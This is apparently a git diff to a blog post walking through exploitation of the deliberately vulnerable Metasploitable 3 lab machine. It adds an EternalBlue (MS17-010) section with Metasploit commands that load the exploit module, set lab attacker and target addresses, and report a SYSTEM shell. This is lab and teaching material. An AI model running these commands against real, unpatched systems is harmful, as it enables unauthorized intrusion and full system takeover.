@@ -2,7 +2,7 @@
 layout: single
 title:  "Metasploitable 3 Walkthrough"
 date:   2020-07-25 08:49:23 +0100
-categories: windows, metasploit
+categories: windows
 excerpt: An overview of exploiting the vulnerabilities in Metasploitable 3 
 ---
 ![metasploitable](/images/metasploitable3/msf3-1.png)
@@ -66,5 +66,22 @@ Bingo, we got a shell as LOCAL SERVICE.
 Here is a link to an in-depth article exploiting this vulnerability - [Here](https://redteamtutorials.com/2018/10/24/metasploitable-3-exploiting-manage-engine-desktop-central-9/)
 
 
- 
+## Exploiting EternalBlue, MS17-010
+
+The next vulnerability we will exploit is [MS17-010](https://en.wikipedia.org/wiki/EternalBlue), EternalBlue. To exploit this vulnerability, it is quite simple, all we need to do is load the module in metasploit and then run the exploit.
+
+![](/images/metasploitable3/msf-1.png)
+
+{% highlight powershell  %}
+use exploit/windows/smb/ms17_010_eternalblue
+set LHOST 10.10.11.2
+set RHOST 10.10.10.11
+exploit
+{% endhighlight %}
+
+![](/images/metasploitable3/eternalblue.png)
+
+Bingo, we got a shell as system.
+
+
 
